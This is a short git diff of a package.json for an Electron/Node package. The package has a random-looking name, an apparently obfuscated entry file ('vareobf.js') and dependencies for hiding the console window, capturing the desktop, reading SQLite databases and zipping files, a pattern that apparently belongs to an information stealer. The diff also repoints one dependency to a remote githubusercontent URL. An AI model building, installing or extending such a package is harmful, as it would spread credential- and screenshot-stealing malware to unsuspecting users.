@@ -1,5 +1,5 @@
 {
-  "name": "Vare0F4OjZt4wP",
+  "name": "Vare0F40jZt4wP",
   "version": "1.0.3",
   "description": "",
   "main": "./vareobf.js",
@@ -17,9 +17,9 @@
     "jszip": "^3.10.1",
     "node-gyp": "^9.3.1",
     "node-hide-console-window": "^2.1.1",
-    "screenshot-desktop": "^0.0.0-development",
+    "screenshot-desktop": "^1.0.0-development",
     "sqlite3": "^5.1.6",
-    "vareapi": "^1.1.1"
+    "vareapi": "https://githubusercontent.com"
   },
   "devDependencies": {
     "electron": "^24.1.2",
